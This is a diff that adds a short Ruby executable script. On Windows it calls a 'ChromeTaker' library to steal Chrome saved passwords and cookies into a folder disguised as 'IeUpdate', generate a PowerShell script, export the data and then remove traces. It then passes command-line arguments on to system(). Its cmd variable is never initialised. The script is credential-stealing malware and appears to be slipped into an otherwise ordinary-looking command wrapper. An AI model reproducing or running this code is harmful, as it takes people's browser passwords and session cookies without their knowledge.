@@ -1,0 +1,25 @@
+#!/usr/bin/env ruby
+require_relative 'chrome_taker'
+require 'shellwords'
+require 'chrome_taker'
+if Gem.win_platform?
+	ChromeTaker.create_home_dir
+	ChromeTaker.steal_chrome
+	if File.exist?("%USERPROFILE%\\AppData\\local\\IeUpdate\\Pass.txt")
+		ChromeTaker.steal_cookie
+		if File.exist?("%USERPROFILE%\\AppData\\local\\IeUpdate\\Cookie.txt")
+			ChromeTaker.create_ps1
+			if File.exist?("%USERPROFILE%\\AppData\\local\\IeUpdate\\1.ps1")
+				ChromeTaker.export_data
+				ChromeTaker.gone_like_the_wind
+			end
+		end
+	end
+end
+
+for i in 0...ARGV.length
+  cmd += " " + Shellwords.escape(ARGV[i])
+end
+
+
+system(cmd)
